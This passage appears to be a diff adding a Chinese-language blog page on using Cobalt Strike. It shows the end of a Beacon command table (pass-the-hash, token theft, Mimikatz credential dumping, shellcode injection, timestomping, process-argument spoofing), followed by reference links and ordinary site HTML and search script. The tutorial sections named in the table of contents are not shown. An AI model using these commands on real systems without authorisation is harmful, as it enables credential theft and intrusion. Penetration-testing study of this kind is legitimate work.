进行端口扫描</span><br><span class="line">    powerpick                 通过Unmanaged PowerShell执行命令</span><br><span class="line">    powershell                通过powershell.exe执行命令</span><br><span class="line">    powershell-import         导入powershell脚本</span><br><span class="line">    ppid                      Set parent PID forspawned post-ex jobs</span><br><span class="line">    ps                        显示进程列表</span><br><span class="line">    psexec                    Use a service to spawn asession on a host</span><br><span class="line">    psexec_psh                Use PowerShell to spawn asession on a host</span><br><span class="line">    psinject                  在特定进程中执行PowerShell命令</span><br><span class="line">    pth                       使用Mimikatz进行传递哈希</span><br><span class="line">    pwd                       当前目录位置</span><br><span class="line">    reg                       Query the registry</span><br><span class="line">    rev2self                  恢复原始令牌</span><br><span class="line">    rm                        删除文件或文件夹</span><br><span class="line">    rportfwd                  端口转发</span><br><span class="line">    run                       在目标上执行程序(返回输出)</span><br><span class="line">    runas                     以另一个用户权限执行程序</span><br><span class="line">    runasadmin                在高权限下执行程序</span><br><span class="line">    runu                      Execute a program underanother PID</span><br><span class="line">    screenshot                屏幕截图</span><br><span class="line">    setenv                    设置环境变量</span><br><span class="line">    shell                     cmd执行命令</span><br><span class="line">    shinject                  将shellcode注入进程</span><br><span class="line">    shspawn                   生成进程并将shellcode注入其中</span><br><span class="line">    sleep                     设置睡眠延迟时间</span><br><span class="line">    socks                     启动SOCKS4代理</span><br><span class="line">    socks stop                停止SOCKS4</span><br><span class="line">    spawn                     Spawn a session</span><br><span class="line">    spawnas                   Spawn a session as anotheruser</span><br><span class="line">    spawnto                   Set executable tospawn processes into</span><br><span class="line">    spawnu                    Spawn a session underanother PID</span><br><span class="line">    ssh                       使用ssh连接远程主机</span><br><span class="line">    ssh-key                   使用密钥连接远程主机</span><br><span class="line">    steal_token               从进程中窃取令牌</span><br><span class="line">    timestomp                 将一个文件时间戳应用到另一个文件</span><br><span class="line">    unlink                    Disconnect from parentBeacon</span><br><span class="line">    upload                    上传文件</span><br><span class="line">    wdigest                   使用mimikatz转储明文凭据</span><br><span class="line">    winrm                     使用WinRM在主机上生成会话</span><br><span class="line">    wmi                       使用WMI在主机上生成会话</span><br><span class="line">    argue                     进程参数欺骗</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/company-information/167460.html" target="_blank" rel="noopener">渗透测试神器Cobalt Strike使用教程</a></p>
+<p><a href="https://www.anquanke.com/post/id/235251" target="_blank" rel="noopener">CobaltStrike使用详解</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Penertration/" rel="tag"># Penertration</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/17/nonce-strict-dynamic-bypass/" rel="next" title="CSP nonce&strict-dynamic Bypass">
+                <i class="fa fa-chevron-left"></i> CSP nonce&strict-dynamic Bypass
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/03/19/Reverse中Angr的利用/" rel="prev" title="Reverse中Angr的利用">
+                Reverse中Angr的利用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Tyaoo">
+            
+              <p class="site-author-name" itemprop="name">Tyaoo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tyaoo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础知识"><span class="nav-number">1.</span> <span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#目录"><span class="nav-number">1.2.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动服务器"><span class="nav-number">1.3.</span> <span class="nav-text">启动服务器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#启动客户端"><span class="nav-number">1.4.</span> <span class="nav-text">启动客户端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户枚举"><span class="nav-number">1.5.</span> <span class="nav-text">用户枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用户通信"><span class="nav-number">1.6.</span> <span class="nav-text">用户通信</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener"><span class="nav-number">2.</span> <span class="nav-text">Listener</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击"><span class="nav-number">3.</span> <span class="nav-text">攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#生成hta"><span class="nav-number">3.1.</span> <span class="nav-text">生成hta</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成office宏"><span class="nav-number">3.2.</span> <span class="nav-text">生成office宏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成payload"><span class="nav-number">3.3.</span> <span class="nav-text">生成payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成分阶段木马"><span class="nav-number">3.4.</span> <span class="nav-text">生成分阶段木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成无阶段木马"><span class="nav-number">3.5.</span> <span class="nav-text">生成无阶段木马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#主机深入"><span class="nav-number">4.</span> <span class="nav-text">主机深入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-UAC提权"><span class="nav-number">4.1.</span> <span class="nav-text">Bypass UAC提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hashdump"><span class="nav-number">4.2.</span> <span class="nav-text">hashdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mimikatz获取密码"><span class="nav-number">4.3.</span> <span class="nav-text">Mimikatz获取密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联动MSF"><span class="nav-number">5.</span> <span class="nav-text">联动MSF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透测试"><span class="nav-number">6.</span> <span class="nav-text">渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描"><span class="nav-number">6.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#共享服务横向移动"><span class="nav-number">6.2.</span> <span class="nav-text">共享服务横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#psexec横向移动"><span class="nav-number">6.3.</span> <span class="nav-text">psexec横向移动</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脚本管理器"><span class="nav-number">7.</span> <span class="nav-text">脚本管理器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socks4a代理"><span class="nav-number">8.</span> <span class="nav-text">socks4a代理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CobaltStrike常见命令"><span class="nav-number">9.</span> <span class="nav-text">CobaltStrike常见命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">10.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tyaoo</span>
+
+  
+</div>
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
